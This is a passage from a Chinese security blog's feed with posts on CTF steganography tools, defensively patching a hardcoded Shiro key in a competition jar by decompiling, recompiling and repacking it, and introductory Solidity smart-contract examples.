class="line-numbers-rows"><span></span><span></span></span></code></pre><p>提取图片对应通道的内容，根据对应通道的文件类型确定后缀名：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zsteg <span class="token parameter variable">-E</span> b1,rgb,lsb,xy <span class="token number">1</span>.png <span class="token operator">></span> out.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h2><p>参考：<a href="https://www.freebuf.com/sectool/359063.html">https://www.freebuf.com/sectool/359063.html</a></p><blockquote><p>将图片中的隐藏文件拆分出来</p></blockquote><p>安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> foremost<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>分析文件，然后输出到output文件夹：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">foremost <span class="token parameter variable">-I</span> <span class="token function">file</span> <span class="token parameter variable">-o</span> output<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>audit.txt分析报告也会一并输出到文件夹中</p><hr><h2 id="Stegsolve"><a href="#Stegsolve" class="headerlink" title="Stegsolve"></a>Stegsolve</h2><p>参考：<a href="https://blog.csdn.net/dyw_666666/article/details/88650738">https://blog.csdn.net/dyw_666666/article/details/88650738</a></p><p>下载地址：<a href="http://www.caesum.com/handbook/Stegsolve.jar">http://www.caesum.com/handbook/Stegsolve.jar</a></p><p>Analyse下的功能：</p><ul><li><p>File Format：文件格式，这个主要是查看图片的具体信息</p></li><li><p>Data Extract：数据抽取，图片中隐藏数据的抽取</p></li><li><p>Frame Browser：帧浏览器，主要是对GIF之类的动图进行分解，动图变成一张张图片，便于查看</p></li><li><p>Image Combiner：拼图，图片拼接</p></li></ul><h3 id="Data-Extract——检测LSB（最低有效位）隐写"><a href="#Data-Extract——检测LSB（最低有效位）隐写" class="headerlink" title="Data Extract——检测LSB（最低有效位）隐写"></a>Data Extract——检测LSB（最低有效位）隐写</h3><p>参考：<a href="https://developer.aliyun.com/article/1090023">https://developer.aliyun.com/article/1090023</a></p><p>Data Extract下调整Bit Planes、Bit Order、Bit Plane Order</p><p>一般Bit Planes都是把rgb通道设置为0，然后调整剩下的几个选项</p><h3 id="Image-Combiner——双图操作"><a href="#Image-Combiner——双图操作" class="headerlink" title="Image Combiner——双图操作"></a>Image Combiner——双图操作</h3><p>参考：<a href="https://developer.aliyun.com/article/1090023">https://developer.aliyun.com/article/1090023</a></p><p>当两张 jpg 图片外观、大小、像素都基本相同时，可以考虑进行综合分析，即将两个文件的像素RGB值进行XOR、ADD、SUB等操作，看能否得到有用的信息</p><p>这里使用Image Combiner</p><p>只需要在弹出的窗口中点击左右按钮选择处理方式，有两张图片的RGB值进行XOR、ADD、SUB等操作</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本着有接触过就稍微记录一下的原则，于是就有了这个&lt;/p&gt;</summary>
    
    
    
    <category term="MISC" scheme="http://c1oudfl0w0.github.io/blog/categories/MISC/"/>
    
    
  </entry>
  
  <entry>
    <title>Java修改jar包&amp;DocToolkit fix复现</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/</id>
    <published>2024-06-17T17:03:14.000Z</published>
    <updated>2024-06-22T17:28:56.662Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>给长城杯半决赛线下的jar包创碎很久之后想起来要学这个了，这篇文章基本上可以算是全抄参考文章的了</p><p>参考：</p><p><a href="https://natro92.fun/posts/82174079/">https://natro92.fun/posts/82174079/</a></p><span id="more"></span><hr><h1 id="冷补丁修改-jar-包（一）"><a href="#冷补丁修改-jar-包（一）" class="headerlink" title="冷补丁修改 jar 包（一）"></a>冷补丁修改 jar 包（一）</h1><p>准备反编译jar包需要的工具：</p><p>cfr：这里选择0.152版本（注意这个好像不能挂代理访问）<a href="http://www.benf.org/other/cfr/">http://www.benf.org/other/cfr/</a></p><p>附件选择长城杯半决赛的DocToolkit</p><p>批量转换class文件：（by Natro92）</p><p>decompile.sh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment"># WSL运行</span><span class="token comment"># 设置CFR JAR文件的路径</span><span class="token assign-left variable">CFR_JAR</span><span class="token operator">=</span><span class="token string">"cfr-0.152.jar"</span><span class="token comment"># 设置class文件的根目录</span><span class="token assign-left variable">CLASS_ROOT</span><span class="token operator">=</span><span class="token string">"src/main/java"</span><span class="token comment"># 查找所有的class文件并反编译为java文件</span><span class="token function">find</span> <span class="token variable">$CLASS_ROOT</span> <span class="token parameter variable">-name</span> <span class="token string">"*.class"</span> <span class="token operator">|</span> <span class="token keyword">while</span> <span class="token builtin class-name">read</span> class_file<span class="token punctuation">;</span> <span class="token keyword">do</span>    <span class="token comment"># 获取class文件的目录和文件名</span>    <span class="token assign-left variable">class_dir</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">dirname</span> <span class="token string">"<span class="token variable">$class_file</span>"</span><span class="token variable">)</span></span>    <span class="token assign-left variable">class_name</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">basename</span> <span class="token string">"<span class="token variable">$class_file</span>"</span> .class<span class="token variable">)</span></span>    <span class="token builtin class-name">echo</span> <span class="token variable">$class_name</span>    <span class="token comment"># 反编译class文件并将输出重定向到.java文件</span>    <span class="token function">java</span> <span class="token parameter variable">-jar</span> <span class="token variable">$CFR_JAR</span> <span class="token string">"<span class="token variable">$class_file</span>"</span> <span class="token operator">></span> <span class="token string">"<span class="token variable">$class_dir</span>/<span class="token variable">$class_name</span>.java"</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先把 jar 文件解压到 example 目录（因为是<code>com.example</code>）中（PS：今天才知道 wsl 的<code>/mnt/</code>目录下是我们Windows主机对应的文件，而且可以用任何linux命令，这谁还用传统windows终端啊，以后直接打开文件夹执行wsl就行了）</p><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240618012204750.png" alt="image-20240618012204750"></p><p>解压 jar 包到 example 文件夹中：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">unzip</span> DocToolkit-0.0.1-SNAPSHOT.jar <span class="token parameter variable">-d</span> example<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再将 class 文件放入相关目录中：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> <span class="token parameter variable">-p</span> src/main/java<span class="token function">cp</span> <span class="token parameter variable">-r</span> example/BOOT-INF/classes/* src/main/java/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后进行反编译</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sh</span> decompile.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619003010977.png" alt="image-20240619003010977"></p><p>后面我们需要对 src 中的 class 文件修改，再移回 example 中</p><p>先本地起一下java环境</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> DocToolkit-0.0.1-SNAPSHOT.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后访问localhost:8080，注意这里的localhost实际的ip地址取决于起环境的终端是哪个（wsl的话需要自己看一下<code>ip addr</code>）</p><p>然后取出我们jar包的shirokey</p><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619002249974.png" alt="image-20240619002249974"></p><p>测试一下</p><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619002315399.png" alt="image-20240619002315399"></p><h2 id="修改默认key"><a href="#修改默认key" class="headerlink" title="修改默认key"></a>修改默认key</h2><p>先利用这个工具随机生成一个key：<code>Iyxx0SgsspVZvsJ2E5ke3g==</code></p><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619002550752.png" alt="image-20240619002550752"></p><p>然后修改源码中的硬编码 key 值（别忘了前面要用cfr反编译）：</p><p>src\main\java\com\example\doctoolkit\shiro\ShiroConfig.java</p><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619003157137.png" alt="image-20240619003157137"></p><p>接下来生成新的class文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">CLASS_LIB</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">find</span> example/BOOT-INF/lib/ <span class="token parameter variable">-name</span> <span class="token string">"*.jar"</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">'\n'</span> <span class="token string">':'</span><span class="token variable">)</span></span><span class="token punctuation">;</span>javac <span class="token parameter variable">-cp</span> <span class="token string">".:<span class="token variable">$&#123;CLASS_LIB<span class="token operator">%</span><span class="token operator">:</span>&#125;</span>"</span> src/main/java/com/example/doctoolkit/shiro/ShiroConfig.java src/main/java/com/example/doctoolkit/shiro/UserRealm.java src/main/java/com/example/doctoolkit/controller/admin/AdminController.java<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619003524692.png" alt="image-20240619003524692"></p><p>此时就修改成功了</p><h2 id="重新打包"><a href="#重新打包" class="headerlink" title="重新打包"></a>重新打包</h2><p>先替换原有的 class 文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> src/main/java/com/example/doctoolkit/shiro/ShiroConfig.class example/BOOT-INF/classes/com/example/doctoolkit/shiro/ShiroConfig.class<span class="token function">cp</span> src/main/java/com/example/doctoolkit/shiro/UserRealm.class example/BOOT-INF/classes/com/example/doctoolkit/shiro/UserRealm.class<span class="token function">cp</span> src/main/java/com/example/doctoolkit/controller/admin/AdminController.class example/BOOT-INF/classes/com/example/doctoolkit/controller/admin/AdminController.class<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后打包，把 lib 中的每一个 jar 文件都解压到目录中</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> example/BOOT-INF/lib<span class="token keyword">for</span> <span class="token for-or-select variable">jar</span> <span class="token keyword">in</span> *.jar<span class="token punctuation">;</span> <span class="token keyword">do</span>    <span class="token function">mkdir</span> <span class="token parameter variable">-p</span> <span class="token string">"../lib_unpacked/<span class="token variable">$jar</span>"</span>    <span class="token builtin class-name">cd</span> <span class="token string">"../lib_unpacked/<span class="token variable">$jar</span>"</span>    jar <span class="token parameter variable">-xvf</span> <span class="token string">"../../lib/<span class="token variable">$jar</span>"</span>    <span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/<span class="token punctuation">..</span>/lib<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619004100091.png" alt="image-20240619004100091"></p><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619004144902.png" alt="image-20240619004144902"></p><p>过程有点小久</p><p>然后再重新打包 lib 中 jar 文件，依旧需要花上一点时间</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/lib_unpacked<span class="token keyword">for</span> <span class="token for-or-select variable">dir</span> <span class="token keyword">in</span> *<span class="token punctuation">;</span> <span class="token keyword">do</span>     jar <span class="token parameter variable">-cvfM0</span> <span class="token string">"../lib/<span class="token variable">$dir</span>.jar"</span> <span class="token parameter variable">-C</span> <span class="token string">"<span class="token variable">$dir</span>"</span> <span class="token builtin class-name">.</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>再打包主 jar 文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>jar <span class="token parameter variable">-cvfM0</span> <span class="token punctuation">..</span>/example_repacked.jar <span class="token parameter variable">-C</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>打包完成后我们运行新的jar包</p><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619005712018.png" alt="image-20240619005712018"></p><p>重新测试密钥：<code>Iyxx0SgsspVZvsJ2E5ke3g==</code></p><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619005950967.png" alt="image-20240619005950967"></p><p>新的key检测了出来，说明修改成功</p><hr><h1 id="冷补丁修改-jar-包（二）"><a href="#冷补丁修改-jar-包（二）" class="headerlink" title="冷补丁修改 jar 包（二）"></a>冷补丁修改 jar 包（二）</h1><hr><h1 id="war包"><a href="#war包" class="headerlink" title="war包"></a>war包</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-cvf</span> xxx.war ./*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;给长城杯半决赛线下的jar包创碎很久之后想起来要学这个了，这篇文章基本上可以算是全抄参考文章的了&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://natro92.fun/posts/82174079/&quot;&gt;https://natro92.fun/posts/82174079/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="AWD" scheme="http://c1oudfl0w0.github.io/blog/categories/AWD/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>智能合约</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/</id>
    <published>2024-06-16T15:39:13.000Z</published>
    <updated>2024-06-18T17:26:24.491Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p><p>《区块链技术与实践》—— 机械工业出版社</p><p><a href="https://solidity-cn.readthedocs.io/zh/develop/introduction-to-smart-contracts.html">https://solidity-cn.readthedocs.io/zh/develop/introduction-to-smart-contracts.html</a></p><p><a href="https://github.com/chaseSpace/learn_blockchain/blob/main/smart_contract.md">https://github.com/chaseSpace/learn_blockchain/blob/main/smart_contract.md</a></p><span id="more"></span><hr><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>一种在区块链上存储的、无须中介、自我验证、自动执行合约条款的计算机交易协议。一旦协议参与方达到执行协议的条件，计算机或计算机网络便会自动执行协议并输出相应的结果</p></blockquote><p>例如：打麻将，这种活动无需参与方之外的力量参与就能按照规则自动进行，什么时候判定胜利，什么时候结束牌局，这些都是规则自己需要考虑的（</p><h2 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h2><p>合约模型（自底向上）：基础设施层、合约层、运维层、智能层、表现层和应用层</p><ul><li>基础设施层：封装了分布式账本、共识机制、激励机制、开发环境等基础设施</li><li>合约层：封装了静态的合约数据，包括合约各方达成一致的合约文本、合约代码、符合情景的响应规则和合约创建者指定的合约与外界以及合约之间的交互准则</li><li>运维层：封装了一系列对合约层中静态合约数据的动态操作</li><li>智能层：封装各类智能算法</li><li>表现层：封装了智能合约在实际运用中的各类具体表现形式</li><li>应用层：封装了智能合约及其表现形式的具体应用领域</li></ul><h2 id="运行机制"><a href="#运行机制" class="headerlink" title="运行机制"></a>运行机制</h2><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617001154780.png" alt="image-20240617001154780"></p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>脚本型智能合约：比特币</p><p>图灵完备型智能合约：以太坊和 Hyperledger Fabric 中的智能合约，图灵完备是指能用编程语言模拟任何图灵机，以太坊主要使用 Solidity 和 Serpent 两种智能合约开发语言</p><p>可验证合约型智能合约：Kadena中的智能合约</p><h2 id="技术特征"><a href="#技术特征" class="headerlink" title="技术特征"></a>技术特征</h2><p>去信任化</p><p>自动性</p><p>防篡改</p><p>可追溯</p><hr><h1 id="开发"><a href="#开发" class="headerlink" title="开发"></a>开发</h1><p>以 Solidity 为例</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">SimpleStorage</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">uint</span> storedData<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token builtin">uint</span> x<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        storedData <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> storedData<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一行代码：告诉大家源代码使用Solidity版本0.4.0写的（运行版本 &lt; 0.5.0）。这是为了确保合约不会在新的编译器版本中突然行为异常。</p><p><code>pragma</code> ：告知编译器如何处理源代码的指令的（例如，C&#x2F;C++中的 <a href="https://zh.wikipedia.org/wiki/Pragma_once">pragma once</a> ，让所在的文件在一个单独的编译中只被包含一次，类似于php中的<code>include_once</code>）</p><p>Solidity中合约的含义就是一组代码（它的 <em>函数</em> ）和数据（它的 <em>状态</em> ），它们位于以太坊区块链的一个特定地址上。 </p><p><code>uint storedData</code> ：声明一个类型为 <code>uint</code> （256位无符号整数）的状态变量，叫做 <code>storedData</code> 。 可以认为它是数据库里的一个位置，可以通过调用管理数据库代码的函数进行查询和变更。</p><p>对于以太坊来说，上述的合约就是<strong>拥有合约</strong>（owning contract）。在这种情况下，函数 <code>set</code> 和 <code>get</code> 可以用来<strong>变更</strong>或<strong>取出</strong>变量的值。</p><hr><h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><p>参考：<a href="https://juejin.cn/post/7046041881913851912">https://juejin.cn/post/7046041881913851912</a></p><p>在线IDE：<a href="https://remix.ethereum.org/">https://remix.ethereum.org</a></p><p>对应的文档：<a href="https://remix-ide.readthedocs.io/zh-cn/latest/">https://remix-ide.readthedocs.io/zh-cn/latest/</a></p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">>=</span><span class="token version number">0.6.12</span> <span class="token operator">&lt;</span><span class="token version number">0.9.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">HelloWorld</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**     * @dev Prints Hello World string     */</span>    <span class="token keyword">function</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"Hello World!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译</p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617004945038.png" alt="image-20240617004945038"></p><p>然后部署合约，deploy即可</p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617005633381.png" alt="image-20240617005633381"></p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617005837792.png" alt="image-20240617005837792"></p><p>此时就成功部署了</p><p>这是对应的选项：</p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617005709992.png" alt="image-20240617005709992"></p><p>然后我们打开刚才部署成功的合约地址，点击执行print函数</p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617010109205.png" alt="image-20240617010109205"></p><p>成功输出hello world</p><hr><h2 id="子货币"><a href="#子货币" class="headerlink" title="子货币"></a>子货币</h2><p>下面的合约实现了一个最简单的加密货币：</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.26</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Coin</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 关键字“public”让这些变量可以从外部读取</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> minter<span class="token punctuation">;</span>    <span class="token keyword">mapping</span> <span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span>    <span class="token comment">// 轻客户端可以通过事件针对变化作出高效的反应</span>    <span class="token keyword">event</span> <span class="token function">Sent</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span> <span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 这是构造函数，只有当合约创建时运行</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        minter <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">mint</span><span class="token punctuation">(</span><span class="token builtin">address</span> receiver<span class="token punctuation">,</span> <span class="token builtin">uint</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">!=</span> minter<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        balances<span class="token punctuation">[</span>receiver<span class="token punctuation">]</span> <span class="token operator">+=</span> amount<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">send</span><span class="token punctuation">(</span><span class="token builtin">address</span> receiver<span class="token punctuation">,</span> <span class="token builtin">uint</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">&lt;</span> amount<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> amount<span class="token punctuation">;</span>        balances<span class="token punctuation">[</span>receiver<span class="token punctuation">]</span> <span class="token operator">+=</span> amount<span class="token punctuation">;</span>        <span class="token keyword">emit</span> <span class="token function">Sent</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> receiver<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意，只有创建合约的人才能使货币无中生有，任何人都可以给其他人转币，不需要注册用户名和密码，所需要的只是以太坊密钥对</p><p><code>address public minter</code>：这一行声明了一个可以被公开访问的 <code>address</code> 类型的状态变量。 <code>address</code> 类型是一个160位的值，且不允许任何算数操作，这种类型适合存储合约地址或外部人员的密钥对</p><p><code>public</code>：自动生成一个函数，允许你在这个合约之外访问这个状态变量的当前值，如果没有这个关键字，其他的合约则没有办法访问这个变量</p><p><code>mapping (address =&gt; uint) public balances</code>：创建一个公共状态变量，该类型将address映射为无符号整数</p><p><code>event Sent(address from, address to, uint amount)</code>：声明了一个所谓的” 事件（event）”，它会在 <code>send</code> 函数的最后一行被发出，其中所有的事件都包含了 <code>from</code> ， <code>to</code> 和 <code>amount</code> 三个参数</p><p>特殊函数 <code>Coin</code> 是在创建合约期间运行的构造函数，不能在事后调用。 它永久存储创建合约的人的地址: <code>msg</code> ，这里是全局变量，其中包含一些允许访问区块链的属性。 <code>msg.sender</code> 始终是当前（外部）函数调用的来源地址。</p><p>最后，真正被用户或其他合约所调用的，以完成本合约功能的方法是 <code>mint</code> 和 <code>send</code>。 如果 <code>mint</code> 被合约创建者外的其他人调用则什么也不会发生。 另一方面， <code>send</code> 函数可被任何人用于向他人发送币 （当然，前提是发送者拥有这些币）</p><p>测试：</p><p>给两个节点设置币</p><p>传入参数<code>receiver: 0x1234567890123456789012345678901234567890</code>和<code>amount: 1</code></p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617013407385.png" alt="image-20240617013407385"></p><p><code>receiver: 0x1234567890123456789012345678901234567891</code>和<code>amount: 256</code></p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617013501643.png" alt="image-20240617013501643"></p><p>现在给<code>0x1234567890123456789012345678901234567891</code>发送2个币（我们是minter <code>0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</code>，我这里已经设置了有448个币）</p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617014213176.png" alt="image-20240617014213176"></p><p>balances 分别看一下<code>0x1234567890123456789012345678901234567891</code>和<code>0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</code></p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617014250726.png" alt="image-20240617014250726"></p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617014305217.png" alt="image-20240617014305217"></p><p>可以看到前者多了2个币，后者少了2个币</p><p>那么，如果我们往<code>0x1234567890123456789012345678901234567891</code>节点添加了超过446个币会发生什么？</p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617014446510.png" alt="image-20240617014446510"></p><p>此时不会有输出，即执行失败</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;《区块链技术与实践》—— 机械工业出版社&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://solidity-cn.readthedocs.io/zh/develop/introduction-to-smart-contracts.html&quot;&gt;https://solidity-cn.readthedocs.io/zh/develop/introduction-to-smart-contracts.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/chaseSpace/learn_blockchain/blob/main/smart_contract.md&quot;&gt;https://github.com/chaseSpace/learn_blockchain/blob/main/smart_contract.md&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Blockchain" scheme="http://c1oudfl0w0.github.io/blog/categories/Blockchain/"/>
    
    
  </entry>
  
  <entry>
    <title>fabric搭建</title>
